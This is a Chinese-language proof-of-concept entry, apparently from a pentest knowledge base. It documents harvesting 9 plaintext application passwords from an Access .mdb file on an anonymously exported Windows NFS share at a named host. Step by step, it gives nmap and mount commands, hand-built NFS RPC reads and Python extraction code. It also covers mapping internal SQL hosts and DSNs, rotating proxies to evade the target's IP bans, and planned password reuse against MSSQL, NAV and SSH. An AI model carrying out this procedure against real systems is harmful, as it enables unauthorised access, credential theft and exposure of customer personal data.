# Windows NFS 匿名导出 /ENTERPRISE 内 EWS/EWS.mdb 泄露 9 组明文应用口令（Access 库凭据挖掘 + SQL/DSN 关联）

- **code**: nfs-anon-export-ews-mdb-plaintext-cred-harvest
- **kind**: poc
- **category**: info-leak
- **component**: NFS（Microsoft Windows Services for NFS）/ Exchequer EWS（Access .mdb）
- **severity**: medium
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: 2026-11-11 task#4 / shopto.net，目标 90.152.8.56:2049，经 HTTP CONNECT 出口 181.119.224.25:8080（同出口先做阳性对照：MOUNT /ENTERPRISE status=0，GETATTR root type=2(DIR) mode=0777 size=24576，证明非伪代理）。随后 LOOKUP EWS→EWS→EWS.mdb 并 READ 循环，落盘 4,743,168B；access_parser 解析 Users 表得 9 行且口令列为明文（原值按规脱敏，不入库），UsersCurrent 含工作站/DataSet 标识；旁证 SETUP.USR 见 [SQLDB] Server=tcp:PUPPY，Conduit.bat 见 DSN/CREATOR 链；9 个 .xla 与 move_file.xlsm 的 olevba 全量反编译零 ADODB/Provider/UID/PWD 命中（.xla 面阴性）。全程只读，未写导出。
- **path**: pocs/nfs-anon-export-ews-mdb-plaintext-cred-harvest/nfs-anon-export-ews-mdb-credential-harvest.md
- **tags**: nfs,anonymous-export,auth_unix,access-db,mdb,plaintext-password,credential-leak,credential-harvest,erp,dsn,sql-host,info-leak
- **created_at**: 2026-11-11T20:58:34.032Z
- **engine**: 90.152.8.56:2049 /ENTERPRISE（dynamics-nav.shopto.net）

## 描述

无认证 NFS 导出里的 ERP/收银主库常以 Access .mdb 直接存放；把 EWS/EWS/EWS.mdb 拉回本地后解析 Users 表可直接取得明文应用口令，并从 SETUP.USR / Conduit.bat 取得内部 SQL 主机与 DSN 命名空间，供后续受控复用验证。NFS 挂载/读写原语见 kb#555，Windows NFS 解析与删除坑见 kb#635；本条只讲「拿到文件之后」的凭据挖掘判据。

## 用法

```
1) 先确认匿名导出：MOUNT(100005/3/1) /ENTERPRISE → status=0；GETATTR(100003/3/1) → type=2(DIR)、mode=0777、uid/gid=4294967294、size=24576（阳性对照）。\n2) 取文件：有 mount 权限用 `mount -t nfs -o vers=3,nolock,proto=tcp <IP>:/ENTERPRISE /mnt/ent` 后 cp；容器无 CAP_SYS_ADMIN 时按 kb#555 手搓 LOOKUP(3)+GETATTR(1)+READ(6)，LOOKUP 回包按 kb#635 兼容「无 bool 头的 fhandle3」。\n3) 解析：`mdb-tables -1` / `mdb-export EWS.mdb Users`，或 `python3 -c` 用 access_parser 的 parse_table(\"Users\")；9 行明文口令即成立。\n4) 旁证：grep SETUP.USR 的 [SQLDB] Server=、Conduit.bat 的 DSN/CREATOR，得到内部 SQL 主机/DSN 命名链。\n5) 口令复用按 kb#121 边界：每协议只试 1-2 次，失败即停；报告和入库正文不得回贴明文口令与客户 PII。\n6) 大量 READ 会触发目标 IP 级封禁，取文件与解析压缩在同一时间窗，预置可轮换 CONNECT 出口。
```

## 正文

```
# 匿名 NFS 导出内 EWS（Access .mdb）明文凭据挖掘

## 适用面
Windows + Exchequer/ERP 类主机，rpcbind(111)/NFS(2049) 对公网暴露，导出（如 `/ENTERPRISE`）不做源 IP/认证限制、仅接受 AUTH_UNIX。导出盘内直接存放应用主库 `EWS/EWS/EWS.mdb`（Jet/Access），口令列明文存储。

- NFS 匿名挂载/读写的协议级原语：见 kb#555。
- Windows NFS 的 LOOKUP 回包省略 post_op_fh3 布尔头、v3 删除返 EIO 等坑：见 kb#635。

## 前置条件
- 2049/tcp（及 111）可达；出口被目标 IP 级封禁时用可轮换的 HTTP CONNECT 代理（只承载 TCP）。
- 无需任何账号：AUTH_UNIX flavor=1，uid=0/gid=0，服务端映射 nobody（uid/gid=4294967294）。
- 本地工具：`mount` + nfs-common（首选）；无 mount 权限时用自写 NFSv3 客户端；解析用 `mdbtools` 或 `access-parser`。
- 只读操作，不创建/不删除导出内文件。

## 步骤 1：确认匿名导出（内容级阳性对照）
```
nmap -Pn -sU -p 111 --script rpcinfo <IP>
nmap -Pn -sU -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <IP>
```
判据（缺一不可）：
- rpcinfo 列出 100003(nfs) 与 100005(mountd)；
- MOUNT(100005/3/1, dirpath="/ENTERPRISE") → status=0，返回 32B filehandle；
- GETATTR(100003/3/1) → type=2(DIR)，mode=0777，size=24576，uid/gid=4294967294。

这一步同时是「代理不是伪代理」的阳性对照：能拿到合法 RPC 回包即证明链路到达真实目标。

## 步骤 2：取回目标 .mdb
有 mount 权限：
```
mkdir -p /mnt/ent
mount -t nfs -o vers=3,nolock,proto=tcp <IP>:/ENTERPRISE /mnt/ent
ls -l /mnt/ent/EWS/EWS/EWS.mdb
cp /mnt/ent/EWS/EWS/EWS.mdb ./EWS__EWS.mdb
sha256sum ./EWS__EWS.mdb
```
无 mount 权限（容器无 CAP_SYS_ADMIN）时按 kb#555 手搓 RPC，文件读取只需三条：
- LOOKUP(100003/3/3)：diropargs3{dirfh, name}，逐级 `EWS` → `EWS` → `EWS.mdb`。**该 Windows 实现回包在 status 后直接是 fhandle3 的 uint32 长度 + 32B fh，省略标准 post_op_fh3 的 bool 头**（kb#635），按标准解析会得到 fh=None。
- GETATTR(100003/3/1)：取文件 size。
- READ(100003/3/6)：args{fh, offset:uint64, count:uint32}，按返回 count 推进 offset，直到 eof=1；实测 count=65536，累计 4,743,168B。短读不是失败，继续按 offset 推进；最终累计必须等于 GETATTR size。
- 经 HTTP CONNECT 时：先 `CONNECT <IP>:2049 HTTP/1.1`，之后在同一 TCP 流上发 RPC record marking（4B：last-frag 标志 + 长度）。

判据：字节数与 GETATTR size 一致，sha256 记录到本地 fetch_meta；`file`/`mdb-ver` 确认是 Microsoft Access Database（JET3/JET4）。

## 步骤 3：解析 Access 主库
mdbtools（最省事）：
```
mdb-ver EWS__EWS.mdb
mdb-tables -1 EWS__EWS.mdb
mdb-schema EWS__EWS.mdb
mdb-export EWS__EWS.mdb Users | sed -n '1,20p'
```
access-parser（与本次实测同路径）：
```python
from access_parser import AccessParser

db = AccessParser("EWS__EWS.mdb")
print("tables:", list(db.catalog.keys()))

for t in ("Users", "UsersCurrent", "Settings1", "Settings2",
          "Devices", "MCM", "AccessSettings"):
    try:
        data = db.parse_table(t)
    except Exception as e:
        print(t, "ERR", e)
        continue
    if isinstance(data, dict):
        cols = list(data.keys())
        n = max((len(v) for v in data.values() if isinstance(v, (list, tuple))), default=0)
        print(f"[{t}] rows={n} cols={cols}")
        for i in range(min(n, 3)):
            print({c: (data[c][i] if isinstance(data[c], (list, tuple)) and i < len(data[c]) else None)
                   for c in cols})
```
判据：存在 `Users` 表且口令列（password/pass/pwd 命名）为明文；本次为 9 行。`UsersCurrent` 给当前工作站/数据集标识，Settings1/2 可能带连接参数。

- 明文口令不得回贴到报告/工单；复用验证按 kb#121 的「受控 1-2 次」边界执行。
- 旧 JET3 库若中文乱码，用 mdbtools 的字符集选项；表名以 `mdb-tables` 实际输出为准。

## 步骤 4：同目录旁证（把口令与内部命名空间关联）
```
grep -RIn --binary-files=text -E 'SQLDB|Server=|DSN|CREATOR' /mnt/ent/Ent /mnt/ent/EWS 2>/dev/null
```
实测：
- `Ent/WSTATION/SETUP.USR`：`[SQLDB] Server=tcp:PUPPY` → 内部 SQL 主机（单标签名），是 MSSQL 复用验证的候选。
- `EWS/EWS/Conduit.bat`：DSN `<SITE>STM/<SITE>GM/<SITE>GIM`，CREATOR `STM1/GOM1/GIM1` → 应用→DSN→SQL 的命名链。
- 发货单归档（`ARCHIVE/*.OUT`）含客户姓名/地址/邮箱/电话 PII：只做存在性确认，不批量导出、不入库。

## 失败与常见原因
- MOUNT status=13：导出 allow list 不含本出口，换出口或放弃；status=2：导出名错，先 `showmount -e`。
- READ 超时/连接 reset：大量读会触发目标 IP 级封禁（该目标有前科）；取文件与解析压缩在同一时间窗，预置多出口；CONNECT 只承载 TCP，不要指望 UDP。
- 文件 0B/短：READ 循环把短读误判为失败而提前退出，或代理断流；重取并核对 size/sha256。
- `mdb-tables` 报 not a database：拉到的是锁文件/日志或复制不完整；核对路径 `EWS/EWS/EWS.mdb` 与文件头。
- `access_parser` 表名大小写/编码错：先用 `mdb-tables -1` 看真实表名。
- 只做 olevba 会漏：本次 9 个 `.xla` 与 `move_file.xlsm` 的 olevba 全量反编译零 ADODB/Provider/UID/PWD 命中（.xla 面阴性），但凭据在 `.mdb` 里；不要把「宏里没有」当成「共享里没有」。

## 后续（未验证，勿当结论）
- 9 组口令是否可复用到 MSSQL 1433 / NAV 8081 NTLM / SSH 22：预算耗尽，未做受控验证。按 kb#121，每组在每个协议只试 1-2 次，失败即停。
- 导出可写（kb#555 已由独立 finding 坐实）→ 往 EWS Conduit/DSN 同步目录投递文件是否被应用消费：未验证。

## 痕迹与合规
全程只读，不创建/不删除导出内文件。本地 loot 目录按任务隔离；报告与入库正文不得包含明文口令与客户 PII。
```
